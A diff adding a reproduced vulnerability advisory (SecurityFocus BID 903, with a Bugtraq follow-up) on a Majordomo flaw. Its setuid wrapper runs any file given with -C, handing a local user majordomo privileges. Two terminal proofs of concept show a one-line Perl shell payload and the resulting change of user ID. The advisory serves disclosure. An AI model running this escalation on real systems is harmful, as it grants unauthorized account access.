@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/903/info
+
+It is possible for a local user to gain majordomo privileges through a vulnerability which allows privileged arbitrary commands to be executed. If the -C parameter is passed to majordomo (or one of several other scripts) when run with the setuid root wrapper, the argument to -C will be executed with majordomo privileges. 
+
+This occurs on several scripts: archive2.pl, bounce-remind, config-test, digest, majordomo, request-answer and resend. medit under bin/, and archive_mh.pl, new-list, and sequencer under Tools/ uses 'require' in the same way, but since the wrapper only executes those scripts found in the majordomo installation directory, they cannot be exploited.
+
+shevek@tirin ~$ cat foo.pl
+system("/bin/csh");
+shevek@tirin ~$ /usr/local/majordomo/wrapper majordomo -C /home/shevek/foo.pl
+%
+%whoami
+majordom
+------
+
+Here's another example (using a different script), posted to Bugtraq by Federico G. Schwindt <Federico G. Schwindt> on May 23, 2000:
+
+$ cat /tmp/myconf
+system("/bin/sh");
+$ id
+uid=1000(fgsch) gid=1000(fgsch) groups=1000(fgsch), 0(wheel), 11(core)
+$ ./wrapper bounce-remind -C /tmp/myconf
+$ id
+uid=41(majordom) gid=41(majordom) groups=1000(fgsch), 0(wheel), 11(core)
